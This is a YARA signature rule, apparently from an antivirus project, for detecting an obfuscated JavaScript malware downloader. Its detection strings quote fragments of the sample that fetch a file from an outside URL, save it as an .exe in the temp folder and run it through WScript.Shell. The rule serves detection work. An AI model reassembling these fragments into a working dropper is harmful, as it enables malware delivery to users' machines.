rule sig_20160401_b8cc5cf3880c8015cb0b0534ccc6480b {
  meta:
    description = "datamaliciousorder - file 20160401_b8cc5cf3880c8015cb0b0534ccc6480b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6237fb0e19869647c3a066c707742fce7e5edb90059b1037ee562b8846569726"

  strings:
    $s1  = "function UxmBk(CtbZfj, BsIvt){VmqRs = VmqRs * 1; return CtbZfj - BsIvt;};" fullword ascii
    $s2  = "var YkWtb = function IfbCc() {return WScript[AwOcq](\"WScript\"+\".Shell\");}(), McJlz = 11;" fullword ascii
    $s3  = "if (HlvUpi[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "HlvUpi[HgJjf](\"G\" + \"ET\", \"http://prawoiznaki.pl/k3usa\", false);" fullword ascii
    $s5  = "UnCoy = WScript[GnArv()](\"A\"+\"DODB.Stream\");" fullword ascii
    $s6  = "function JmMuh(){return NoIe + \"\";};" fullword ascii
    $s7  = "function QymMq() {return YkWtb[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"dwLzNwIHscV1.ex\" + \"e\";};" fullword ascii
    $s8  = "function MnOyy() {return ((LkEu == true) && (LkEu == JiLdi)) ? 1 : VmqRs;};" fullword ascii
    $s9  = "function MdqEez(BeaXa){YkWtb[\"R\"+\"un\"](BeaXa, VmqRs, VmqRs);};" fullword ascii
    $s10 = "}while (HaBbz);" fullword ascii
    $s11 = "var PwxHp = false;" fullword ascii
    $s12 = "LkEu = true; " fullword ascii
    $s13 = "UnCoy[\"position\"] = LztOl(VmqRs);" fullword ascii
    $s14 = "var JiLdi = false;" fullword ascii
    $s15 = "function LztOl(DtTjr) {var IqtKgo = (1, 2, 3, 4, 5, DtTjr); return IqtKgo;};" fullword ascii
    $s16 = "var SoPkb = new this[\"Date\"]();" fullword ascii
    $s17 = "function EgvRz()" fullword ascii
    $s18 = "function GnArv(){return AwOcq;};" fullword ascii
    $s19 = "return UxmBk(LglNu, DtuMq);" fullword ascii
    $s20 = "UnCoy[\"clo\"+\"se\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}